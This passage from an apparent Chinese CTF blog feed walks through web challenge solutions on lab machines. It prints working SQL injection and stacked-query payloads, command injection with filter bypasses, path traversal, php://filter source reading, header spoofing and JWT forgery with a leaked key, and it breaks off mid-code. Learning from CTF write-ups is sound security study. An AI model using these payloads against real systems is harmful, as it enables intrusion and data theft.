title="使用场景"></a>使用场景</h3><p><code>multipart/form-data</code> 常用于以下场景：</p><ol><li><strong>文件上传</strong>：当需要通过表单上传文件时，例如图片、文档等。</li><li><strong>包含多部分内容的表单提交</strong>：当表单包含文本字段和文件字段时，<code>multipart/form-data</code> 可以将它们封装为多个部分，以确保所有数据都能正确提交。</li></ol><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><code>multipart/form-data</code> 请求体会被分成多个部分，每一个查询内容以一个<strong>空行</strong>区分元信息和数据。请求中会用一个唯一的 <strong>boundary</strong>（边界字符串）来分隔每个部分。注意该 Header 的值后面需要加一个 <code>boundary</code> 表示界定符，例如<code>Content-Type: multipart/form-data; boundary=abc</code>。那么在 Body 中，以 <code>--abc</code> 表示一个查询字段的开始，当所有查询字段结束后，用 <code>--abc--</code> 表示结束。</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7MA4YWxkTrZu0gW</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">John Doe</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7MA4YWxkTrZu0gW</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;patch.zip&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/zip</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;文件的二进制内容&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span></span><br></code></pre></td></tr></table></figure><p>本题只检查文件名后缀是否为 <code>.zip</code>. 因此如此发包即可：</p><p><img src="/../images/Pasted%20image%2020241029115433.png"></p><p>将拿到的token更新到Cookie。</p><p><img src="/../images/Pasted%20image%2020241029120029.png"></p><p>第六关提示内容指出了 <code>localhost</code>，意在表明需要让服务器认为这是一个来自本地的请求。可以通过设置 <code>Host</code> <code>X-Real-IP</code> <code>X-Forwarded-For</code> <code>Referer</code> 等标头欺骗服务器。</p><ol><li><strong>Host 头</strong><br><code>Host</code> 头用于指定客户端请求的目标主机名和端口。在一些情况下，服务器会根据 <code>Host</code> 头的值来确定请求的合法性或处理方式。伪造 <code>Host</code> 头可以让服务器认为请求来自特定的主机或路径，通常用于：</li></ol><ul><li><strong>绕过访问控制</strong>：一些服务器根据主机名或域名来控制访问权限，通过更改 <code>Host</code> 头可以尝试绕过这种控制。</li><li><strong>子域名欺骗</strong>：某些系统可能依赖 <code>Host</code> 判断访问来源，可以通过伪造 <code>Host</code> 来测试是否能访问特定子域名的数据。</li><li></li></ul><ol start="2"><li><strong>X-Real-IP 和 X-Forwarded-For</strong><br><code>X-Real-IP</code> 和 <code>X-Forwarded-For</code> 是常见的客户端真实 IP 传递头，通常用于代理服务器或负载均衡器向后端服务器传递客户端的真实 IP。</li></ol><ul><li><strong>X-Real-IP</strong>：通常直接包含客户端的真实 IP 地址。</li><li><strong>X-Forwarded-For</strong>：包含一系列 IP 地址，最左侧的是客户端的真实 IP，右侧的 IP 代表通过的代理服务器。<br>通过伪造这些头，可以让服务器认为请求来自指定的 IP。这种欺骗手段常用于：</li><li><strong>绕过 IP 限制</strong>：如果服务器依赖这些头进行 IP 限制或审计，通过伪造 IP 地址可能绕过限制。</li><li><strong>伪造来源</strong>：攻击者可以伪造来源 IP，让日志记录中显示错误的 IP，迷惑服务器的安全检测。</li></ul><ol start="3"><li><strong>Referer</strong><br><code>Referer</code> 头表示请求来源页面的 URL。服务器通常会根据 <code>Referer</code> 判断请求的来源是否合法，尤其是在防御 CSRF（跨站请求伪造）攻击时会使用它。</li></ol><ul><li><strong>绕过 CSRF 保护</strong>：如果服务器仅检查 <code>Referer</code> 来验证请求来源，攻击者可以伪造 <code>Referer</code> 来绕过此保护。</li><li><strong>伪造访问路径</strong>：有些网站根据 <code>Referer</code> 头判断访问路径来源，伪造它可以用来绕过路径限制或伪装请求来源。</li></ul><p>以下任意一种请求都是可以的。</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?ask=miao</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/?ask=miao</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>8.147.132.32:36002<br><span class="hljs-attribute">X-Real-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?ask=miao</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>8.147.132.32:36002<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241029122020.png"></p><p>其中提到了 JWT 和 <code>Pe2K7kxo8NMIkaeN</code>，这个数字和字母组成内容推测应当是 JWT 的密钥。</p><p>JWT（JSON Web Token）是一种轻量级的<strong>认证规范</strong>，用于在用户和服务器之间传递经过签名的、安全的、可信的信息。</p><h3 id="JWT-的结构"><a href="#JWT-的结构" class="headerlink" title="JWT 的结构"></a>JWT 的结构</h3><p>JWT 通常由三个部分组成，用<code>.</code>分隔开：</p><ol><li><strong>Header（头部）</strong>：包含算法类型和令牌类型，通常为 <code>&#123;&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;</code>。</li><li><strong>Payload（有效载荷）</strong>：包含实际传递的信息，如用户 ID、角色、权限等。这些信息以键值对的形式表示。</li><li><strong>Signature（签名）</strong>：使用签名算法和密钥对头部和载荷进行加密生成签名。</li></ol><h3 id="JWT-的工作流程"><a href="#JWT-的工作流程" class="headerlink" title="JWT 的工作流程"></a>JWT 的工作流程</h3><ol><li><strong>用户登录</strong>：用户登录后，服务器验证凭证（如用户名和密码），生成一个 JWT 并发送给客户端。</li><li><strong>客户端存储</strong>：客户端（例如浏览器或移动应用）将 JWT 保存下来，通常会存储在本地存储或 Cookie 中。</li><li><strong>客户端请求</strong>：每次请求时，客户端会携带 JWT，例如通过 <code>Authorization: Bearer &lt;token&gt;</code> 头部。</li><li><strong>服务器验证</strong>：服务器验证 JWT 的签名来确保令牌未被篡改，确认用户身份。</li><li><strong>访问资源</strong>：如果 JWT 有效且权限允许，服务器会允许用户访问资源，否则拒绝请求。</li></ol><h3 id="JWT-IO"><a href="#JWT-IO" class="headerlink" title="JWT.IO"></a>JWT.IO</h3><p><a href="https://jwt.io/">JWT.io</a> 是一个在线工具，可以用来<strong>查看 JWT 内容、生成 JWT、验证 JWT 的签名</strong>。它允许你输入 JWT 和密钥，解析并查看 <code>Header</code> 和 <code>Payload</code> 的内容，验证签名的正确性。</p><p>将我们当前的 Cookie 粘贴入网站：<br><img src="/../images/Pasted%20image%2020241029123820.png"><br>将payload改为 <code>0</code> ,粘贴入签名密钥<code>Pe2K7kxo8NMIkaeN</code>之后。<br><img src="/../images/Pasted%20image%2020241029124302.png"><br>复制左侧 Encoded 的内容，回到靶机界面应用该 token 值修改 Cookie，再次刷新网页，即到达最终页面。<br><img src="/../images/Pasted%20image%2020241029125336.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;headach3&quot;&gt;&lt;a href=&quot;#headach3&quot; class=&quot;headerlink&quot; title=&quot;headach3&quot;&gt;&lt;/a&gt;headach3&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/../images/Pasted%20image%2020241026</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF Web 解题记录</title>
    <link href="http://example.com/2024/09/06/BUUCTF-Web-WP1/"/>
    <id>http://example.com/2024/09/06/BUUCTF-Web-WP1/</id>
    <published>2024-09-06T01:27:53.000Z</published>
    <updated>2024-12-09T08:33:16.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>首先随意输入用户名及密码，发现url变化，说明是get请求。</p><p><img src="/../images/Pasted%20image%2020240906102626.png"></p><p>输入1‘，判断是字符型注入还是数字型注入。发现报错，说明是字符型注入。</p><p><img src="/../images/Pasted%20image%2020240906103035.png"></p><p>输入万能密码：1’ or 1&#x3D;1# 或者 1‘ or ’1‘&#x3D;1，注意是英文字符。</p><p><img src="/../images/Pasted%20image%2020240906103357.png"></p><p>登录成功。</p><p><img src="/../images/Pasted%20image%2020240906103454.png"></p><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>打开靶机，发现没有任何信息。</p><p><img src="/../images/Pasted%20image%2020240906103740.png"></p><p>按下F12，发现源代码中有一段php注释。</p><p><img src="/../images/Pasted%20image%2020240906104057.png"></p><p>对url作如下改动，解题成功。</p><p><img src="/../images/Pasted%20image%2020240906104327.png"></p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>F12查看源代码，发现注释内容。</p><p><img src="/../images/Pasted%20image%2020240906111535.png"></p><p>访问source.php。</p><p><img src="/../images/Pasted%20image%2020240906111804.png"></p><p>根据<code> $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 访问hint.php。</p><p><img src="/../images/Pasted%20image%2020240906111946.png"></p><p>代码审计。</p><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (! isset($page) || !is_string($page)) &#123;  <br>                echo <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span><span class="hljs-comment">;  </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$page是否为字符串</span><br><br><span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$page是否在白名单</span><br><br> $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br><span class="hljs-meta"># mb_substr，截取字符串</span><br><span class="hljs-meta"># mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)：将$page与<span class="hljs-string">&#x27;?&#x27;</span>连接，返回<span class="hljs-string">&#x27;?&#x27;</span>第一次出现的位置。</span><br><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$_page是否在白名单</span><br><br>$_page = urldecode($page)<span class="hljs-comment">;</span><br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;</span><br>            &#125;<br><span class="hljs-meta"># 将$page进行URL解码，并重复之前的处理步骤，如果$_page在白名单中存在，返回true。</span><br><br><span class="hljs-keyword">if</span> (! empty($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>    ) &#123;  <br>        include $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]<span class="hljs-comment">;  </span><br>        <span class="hljs-keyword">exit</span><span class="hljs-comment">;  </span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        echo <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;</span>https://i.loli.net/<span class="hljs-number">2018</span>/<span class="hljs-number">11</span>/<span class="hljs-number">01</span>/<span class="hljs-number">5</span>bdb0d93dc794.jpg\<span class="hljs-string">&quot; /&gt;&quot;</span><span class="hljs-comment">;  </span><br>    &#125;<br><span class="hljs-meta"># 检查$_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]是否存在且为字符串类型，并调用emmm::checkFile方法进行检查。如果返回值为true，则通过<span class="hljs-keyword">include</span>语句包含$_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]指定的文件并终止程序执行，否则输出一个图片标签。</span><br></code></pre></td></tr></table></figure><p>分析代码后，发现只需传入一个在白名单内的文件名，并添加上问号，就可以保证每次找去用于检查的内容都在白名单，返回true。</p><p>依次通过…&#x2F;…&#x2F;构造payload，去查看到底是几层的根目录。</p><p><code>/source.php?file=source.php?/../../../../ffffllllaaaagggg</code></p><p><img src="/../images/Pasted%20image%2020240906125139.png"></p><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>根据url，判断属于文件包含。</p><p><img src="/../images/Pasted%20image%2020240906141651.png"></p><p>查看源代码并没有看到flag，猜测其可能被注释。利用php:&#x2F;&#x2F;filter伪协议来查看flag.php的源代码。</p><p> <strong>php:&#x2F;&#x2F;filter</strong>：</p><ul><li>作用：php:&#x2F;&#x2F;filter可以获取指定文件源码。当其与文件包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以一般对其进行编码，阻止其不执行，从而读取任意文件源代码。</li><li>场景：<ul><li>知道flag文件地址后，可以直接用该协议读取文件内容。</li><li>有时候一些关键字被过滤也可以用该协议绕过。</li><li>有的flag隐藏在注释当中，可通过此协议查看源码获取flag。</li></ul></li><li>格式：<br> <img src="/../images/Pasted%20image%2020240906150746.png"><br>构造payload：<code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></li></ul><p><img src="/../images/Pasted%20image%2020240906150933.png"></p><p>解码得到flag。</p><p><img src="/../images/Pasted%20image%2020240906151334.png"></p><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>命令注入题</p><p><img src="/../images/Pasted%20image%2020240906151944.png"></p><p>输入127.0.0.1；ls &#x2F;</p><p>前后两条命令都会执行</p><p><img src="/../images/Pasted%20image%2020240906152254.png"></p><p>输入 127.0.0.1;cat &#x2F;flag，查看根目录的flag文件。</p><p><img src="/../images/Pasted%20image%2020240906152643.png"></p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>输入?ip&#x3D;127.0.0.1;ls</p><p><img src="/../images/Pasted%20image%2020240906160149.png"></p><p>cat flag.php，发现空格被过滤。说明index.php中有相关设置。</p><p><img src="/../images/Pasted%20image%2020240906160424.png"></p><p>命令绕过空格的方法：</p><figure class="highlight erlang"><table><tr><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">$&#123;</span>IFS&#125;<span class="hljs-string">$9</span><br>&#123;IFS&#125;<br><span class="hljs-string">$I</span>FS<br><span class="hljs-string">$&#123;</span>IFS&#125;<br><span class="hljs-string">$I</span>FS<span class="hljs-string">$1</span> //<span class="hljs-string">$1</span>改成<span class="hljs-string">$加</span>其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br><span class="hljs-comment">%20   (space)</span><br><span class="hljs-comment">%09   (tab)</span><br>X=<span class="hljs-string">$&#x27;</span>cat\x09./flag.php&#x27;;<span class="hljs-string">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure><p>发现$IFS$1可行。</p><p><img src="/../images/Pasted%20image%2020240906160956.png"></p><p>这里我们发现flag也被过滤了。</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>    <span class="hljs-comment"># flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</span><br></code></pre></td></tr></table></figure><p>变量替换：<br>?ip&#x3D;127.0.0.1;b&#x3D;g;cat$IFS$1fla$b.php<br>或者?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$1$b$a.php<br>注意不能按顺序出现flag！</p><p><img src="/../images/Pasted%20image%2020240906164613.png"></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><img src="/../images/Pasted%20image%2020240909142219.png"></p><p>查看writeup题解后，发现题目sql查询字符串的内容为：</p><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> $_POST[<span class="hljs-string">&#x27;query&#x27;</span>] || flag from Flag<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ol><li><p>查询法<br>和SQL语句拼接后：<br><code>select *,1 || flag from Flag</code><br>1和flag的结果是1，然后语句就成为了  “<br><code>select *,1 from Flag</code></p></li><li><p>操作符重置法<br><code>1;set sql_mod=PIPES_AS_CONCAT;select 1</code><br>插入SQL语句就成为<br><code>select concat(1,flag) from Flag;</code><br>SQL_MOD：是MySQL支持的基本语法、校验规则 。其中<code>PIPES_AS_CONCAT</code>会将<code>||</code>认为字符串的连接符，而不是或运算符，这时<code>||</code>符号就像<code>concat</code>函数一样。</p></li></ol><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>测试万能密码1’ or 1&#x3D;1 #</p><p><img src="/../images/Pasted%20image%2020240910132838.png"></p><p>输出了该表的所有数据，说明存在sql注入。</p><p>输入select，判断是否有关键字过滤。</p><p><img src="/../images/Pasted%20image%2020240910133825.png"></p><p>preg_match函数用于执行正则表达式，也就是说，系统通过该代码将select等关键字都过滤了，联合查询，报错注入，布尔,时间盲注就都不可以使用了，只剩下堆叠注入。</p><p>查看数据库名：<code>1&#39;;show databases;#</code></p><p><img src="/../images/Pasted%20image%2020240910134344.png"><br>查看数据表：<code>1&#39;;show tables;#</code><br><img src="/../images/Pasted%20image%2020240910134604.png"></p><p>获取第一个表1919810931114514的表结构，有两种方式：<br>方式一：<code>1&#39;; show columns from tableName;#</code><br>方式二：<code>1&#39;;desc tableName;#</code><br>注意，如果tableName是纯数字，需要用反引号包裹。</p><p><img src="/../images/Pasted%20image%2020240910142759.png"></p><p>单引号 ’ 或双引号是字符串的引用符号。<br>反引号是数据库、表、索引、列和别名的引用符。<br>两者在linux下不区分，windows下区分。</p><p>获取字段名flag：<br><img src="/../images/Pasted%20image%2020240910143035.png"></p><p>由于select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字。</p><p><strong>预编译</strong>：相当于定一个语句相同，参数不同的Mysql模板。</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>举例：查询ID为1的用户：</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><p>输入<strong>1’;PREPARE xsh from concat(‘s’,’elect’,’ * from  <code>1919810931114514</code>‘);EXECUTE xsh;#</strong></p><p>注意表名加上反引号。<br><img src="/../images/Pasted%20image%2020240910145812.png"></p><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><strong>常规sql注入流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 判断类型<br><span class="hljs-bullet">2.</span> 万能密码<br><span class="hljs-bullet">3.</span> 判断字段数 order by<br><span class="hljs-bullet">4.</span> 找回显点<br><span class="hljs-bullet">5.</span> 爆数据库，版本<br><span class="hljs-bullet">6.</span> 爆表<br><span class="hljs-bullet">7.</span> 爆字段<br></code></pre></td></tr></table></figure><p>解题步骤如下：</p><ol><li>输入1’，报错，说明是字符型注入。</li><li>输入1‘ or 1&#x3D;1#。<br><img src="/../images/Pasted%20image%2020240910155412.png"></li><li>order by 2,3时均没有报错。<br><img src="/../images/Pasted%20image%2020240910155757.png"><br>order by 4时报错。说明表有三个字段。<br><img src="/../images/Pasted%20image%2020240910155942.png"></li><li>联合查询，判断回显点。<br><img src="/../images/Pasted%20image%2020240910160858.png"><br>发现回显点是2,3。<br><img src="/../images/Pasted%20image%2020240910161141.png"></li><li>database(),version()<br><img src="/../images/Pasted%20image%2020240910171728.png"></li><li>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’geek’ #<br><img src="/../images/Pasted%20image%2020240910172344.png"></li><li>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’geek’ and table_name&#x3D;’l0ve1ysq1’ #<br><img src="/../images/Pasted%20image%2020240910172852.png"></li><li>1’ union select 1,2,group_concat(password) from l0ve1ysq1 #<br><img src="/../images/Pasted%20image%2020240910173544.png"></li></ol><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>F12查看源代码，发现.&#x2F;Archive_room.php</p><p><img src="/../images/Pasted%20image%2020240911094851.png"></p><p>访问该文件，没发现有用信息。</p><p><img src="/../images/Pasted%20image%2020240911100641.png"></p><p>burpsuite抓包，发送到repeater，发现一个被注释了的文件。</p><p><img src="/../images/Pasted%20image%2020240911101805.png"></p><p>代码审计。</p><p><img src="/../images/Pasted%20image%2020240911101942.png"></p><p>访问flag.php。</p><p><img src="/../images/Pasted%20image%2020240911102043.png"></p><p>看到include函数，说明<code>secr3t.php</code> 存在文件包含漏洞。<br>想到之前做过的# [ACTF2020 新生赛]Include文件包含题目。<br>php:&#x2F;&#x2F;filter可以获取指定文件源码。<br><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php </code><br><img src="/../images/Pasted%20image%2020240911115928.png"></p><p>解码：</p><p><img src="/../images/Pasted%20image%2020240911120041.png"></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>查看源代码。</p><p><img src="/../images/Pasted%20image%2020240911123410.png"></p><p>访问Secret.php。</p><p><img src="/../images/Pasted%20image%2020240911123630.png"></p><p>它需要我们从<a href="https://www.sycsecret.com来访问它./">https://www.Sycsecret.com来访问它。</a><br>burpsuite抓包发送到repeater，在header中添加上 <code>Referer:https://www.Sycsecret.com</code> ，来伪造访问来源。</p><p><img src="/../images/Pasted%20image%2020240911124812.png"></p><p>提示请使用 Syclover 浏览器。添加<code>User-Agent</code>来伪造访问工具为 Syclover 浏览器。<br><img src="/../images/Pasted%20image%2020240911125016.png"></p><p>提示只能在本地阅读。添加<code>X-Forwarded-For</code>伪造本地ip 127.0.0.1。</p><p><img src="/../images/Pasted%20image%2020240911130019.png"></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>万能密码报错，分析关键词可能被过滤，通过双写绕过。<br>被过滤的关键词：or, by, union, select, from, information中的or, where, and, password中的or<br>按照[极客大挑战 2019]LoveSQL的流程完成。</p><p><img src="/../images/Pasted%20image%2020240912104735.png"></p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>提示：备份网站。</p><p><img src="/../images/Pasted%20image%2020240912111232.png"></p><p>用dirsearch扫描网站目录。<br><code>python dirsearch.py -u http://d43405f8-0170-433b-9443-f3fc89bb975c.node5.buuoj.cn:81/</code></p><p>常见的网站源码备份文件后缀: tar.gz，zip，rar，tar<br>常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp</p><p>扫描到<a href="http://www.zip,下载./">www.zip，下载。</a></p><p><img src="/../images/Pasted%20image%2020240912112050.png"><br><img src="/../images/Pasted%20image%2020240912112201.png"></p><p>打开index.php，发现包含get形式传参、一个class.php和反序列化操作。</p><p><img src="/../images/Pasted%20image%2020240912113423.png"></p><p>class.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span 